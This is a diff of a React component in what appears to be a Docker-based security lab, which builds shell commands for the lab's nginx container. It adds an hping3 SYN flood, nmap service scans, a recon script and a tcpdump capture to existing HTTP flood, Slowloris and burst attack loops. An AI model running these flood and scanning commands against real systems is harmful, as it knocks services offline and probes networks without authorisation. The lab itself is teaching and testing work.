@@ -5,13 +5,13 @@ import api from '../../api';
 function generateCommand(type, rps, concurrency, duration) {
   switch (type) {
     case 'flood':
-      return `# HTTP Flood Attack - ${rps} req/s, ${concurrency} concurrent connections
+      return `# HTTP Flood Attack - ${rps} req/s, ${concurrency} concurrent
 for i in $(seq 1 ${rps * duration}); do
   curl -s -o /dev/null -w "%{http_code}" http://nginx:80/api/health &
   [ $(( i % ${concurrency} )) -eq 0 ] && wait
   sleep $(echo "scale=3; 1/${rps}" | bc)
 done
-echo "Flood complete: sent ${rps * duration} requests"`;
+echo "[+] Flood complete: sent ${rps * duration} requests"`;
 
     case 'slowloris':
       return `# Slowloris Attack - ${concurrency} slow connections for ${duration}s
@@ -24,20 +24,53 @@ for i in $(seq 1 ${concurrency}); do
 done
 sleep ${duration}
 kill %- 2>/dev/null
-echo "Slowloris complete"`;
+echo "[+] Slowloris complete"`;
 
     case 'burst':
-      return `# Burst Attack - ${concurrency * 10} requests per burst, 5s intervals
+      return `# Burst Attack - ${concurrency * 10} requests per burst
 for round in $(seq 1 $(( ${duration} / 5 ))); do
   echo "=== Burst round $round ==="
   for i in $(seq 1 ${concurrency * 10}); do
     curl -s -o /dev/null -w "%{http_code} " http://nginx:80/api/health &
   done
-  wait
-  echo ""
+  wait; echo ""
   sleep 5
 done
-echo "Burst complete"`;
+echo "[+] Burst complete"`;
+
+    case 'syn_flood':
+      return `# SYN Flood (hping3) - ${rps} pps to nginx:80
+hping3 -S --flood -V -p 80 nginx`;
+
+    case 'nmap_scan':
+      return `# Nmap Service Scan - all containers on 172.28.0.0/16
+echo "[*] Quick scan of Docker network..."
+nmap -sV -T4 --open 172.28.0.0/24
+echo ""
+echo "[*] Detailed scan of nginx..."
+nmap -A -p 80,443 nginx`;
+
+    case 'recon':
+      return `# Network Recon - discover services
+echo "=== [1/5] DNS Resolution ==="
+dig nginx +short
+echo ""
+echo "=== [2/5] Traceroute ==="
+traceroute -n nginx
+echo ""
+echo "=== [3/5] Port Scan ==="
+nmap -sT -T4 --top-ports 100 nginx
+echo ""
+echo "=== [4/5] SSL Check ==="
+echo | openssl s_client -connect nginx:443 2>/dev/null | openssl x509 -noout -subject -dates 2>/dev/null || echo "No SSL on 443"
+echo ""
+echo "=== [5/5] HTTP Headers ==="
+curl -sI http://nginx:80/`;
+
+    case 'tcpdump_capture':
+      return `# Live Packet Capture - 30 seconds
+echo "[*] Capturing packets for ${duration}s..."
+timeout ${duration} tcpdump -i any -n -c 100 'host nginx' -A 2>/dev/null || echo "tcpdump requires NET_ADMIN capability"`;
 
     default:
       return `echo "Unknown attack type: ${type}"`;
@@ -103,7 +136,7 @@ function DDoSControl({ onSendCommand, terminalMode }) {
     <div className="ddos-control">
       <div className="ddos-header" onClick={() => setCollapsed(!collapsed)}>
         <span>{collapsed ? '▶' : '▼'}</span>
-        <span className="ddos-title">DDoS Simulation</span>
+        <span className="ddos-title">Attack & Recon Lab</span>
         {running && <span className="ddos-running-indicator" />}
       </div>
 
@@ -117,9 +150,17 @@ function DDoSControl({ onSendCommand, terminalMode }) {
             <div className="control-group">
               <label>Attack Type</label>
               <select value={type} onChange={e => setType(e.target.value)} disabled={running}>
-                <option value="flood">HTTP Flood</option>
-                <option value="slowloris">Slowloris</option>
-                <option value="burst">Burst</option>
+                <optgroup label="DDoS Attacks">
+                  <option value="flood">HTTP Flood (curl)</option>
+                  <option value="slowloris">Slowloris (nc)</option>
+                  <option value="burst">Burst (curl)</option>
+                  <option value="syn_flood">SYN Flood (hping3)</option>
+                </optgroup>
+                <optgroup label="Recon & Scanning">
+                  <option value="nmap_scan">Nmap Service Scan</option>
+                  <option value="recon">Full Recon (dig+nmap+ssl+curl)</option>
+                  <option value="tcpdump_capture">Packet Capture (tcpdump)</option>
+                </optgroup>
               </select>
             </div>
 
@@ -163,7 +204,11 @@ function DDoSControl({ onSendCommand, terminalMode }) {
           <div className="ddos-actions">
             {!running ? (
               <button className="btn-attack" onClick={handleStart}>
-                {terminalMode ? '📝 터미널에 명령어 전송' : '⚡ 시뮬레이션 시작'}
+                {terminalMode
+                  ? '📝 터미널에 명령어 전송'
+                  : ['nmap_scan', 'recon', 'tcpdump_capture'].includes(type)
+                    ? '🔍 스캔 실행'
+                    : '⚡ 공격 시작'}
               </button>
             ) : (
               <button className="btn-stop" onClick={handleStop}>
